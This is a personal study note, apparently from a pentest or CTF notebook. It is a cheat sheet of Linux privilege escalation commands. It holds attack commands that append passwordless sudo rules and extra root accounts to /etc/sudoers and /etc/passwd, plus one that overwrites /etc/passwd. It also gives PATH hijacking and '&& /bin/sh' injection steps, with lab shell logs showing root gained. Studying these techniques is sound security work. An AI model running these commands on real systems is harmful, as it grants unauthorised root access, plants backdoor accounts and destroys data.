---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Linux Privilege Escalation]]  
___

## Description:  

### look for vulnerable programs that run as root

[gtfobins](https://gtfobins.github.io/)

**What commands can the user execute with sudo?

`sudo -l

**What is the kernel version and architecture type?

`uname -a

`uname -r

**What is the OS version

`cat /etc/*-release

**What languages are installed?

`man -k language

`which gcc

`which g++

**What are the SUID/GUID binaries?

``find / -perm -u=s -type f 2>/dev/null

``find / -perm -g=s -type f 2>/dev/null

** Are there world writable files?

`find / -perm -2 –type f

**What have users been doing? Command history?

`history

``.bash_history

**Are there any plaintext credentials to be found?

`find . -type f | xargs grep –i “password”

`grep –r . –e “password” 2>/dev/null

**What jobs are scheduled?

`crontab -l

l`s -lah /etc/cron* 2>/dev/null

**Scripts that can be used if they run as root:

`echo “user ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers

`echo “user::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd

`bash -i

**Editing the Sudoers file to give root

change:

`loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht 

To:

`loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht 

`loneferret@Kioptrix3:~$ sudo /bin/su 

**What processes and services are running?  Which are running as root?

`ps –ef

`ps –ef | grep root

**Is /etc/passwd writable?

`echo root::0:0:root:/root:/bin/bash > /etc/passwd

Removing x means root requires no password anymore

--OR--

generate hash of the password:

`openssl passwd -1 -salt [salt value] {password}

`openssl passwd -1 -salt user3 pass123

to create a second root user with "mrcake" password:

`echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd

to switch to a root2 account that was just created:

`su root2

`Password: mrcake

**Can you run tcpdump?

run tcpdump with -I lo for loopback

or what other systems are connecting to it? You might be able to get a username and password

**Program that runs a command without an absolute path

Create a program with the same name in the tmp directory (echo /bin/bash >> command) and then add tmp to the beginning of path (export PATH=/tmp:$PATH)

```
kane@pwnlab:~$ cd /tmp

cd /tmp

kane@pwnlab:/tmp$ echo /bin/bash > cat

echo /bin/bash > cat

kane@pwnlab:/tmp$ chmod 777 cat

chmod 777 cat

kane@pwnlab:/tmp$ export PATH=/tmp:$PATH

export PATH=/tmp:$PATH

kane@pwnlab:/tmp$ cd /home/kane

cd /home/kane

kane@pwnlab:~$ ./msgmike

./msgmike

mike@pwnlab:~$ id

id

uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)

```
**Can you use command concatenation with && /bin/sh or &&/bin/bash?

```
mike@pwnlab:/home/mike$ ./msg2root

./msg2root

Message for root: hello && /bin/sh

hello && /bin/sh

hello

# id

id

uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)

```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>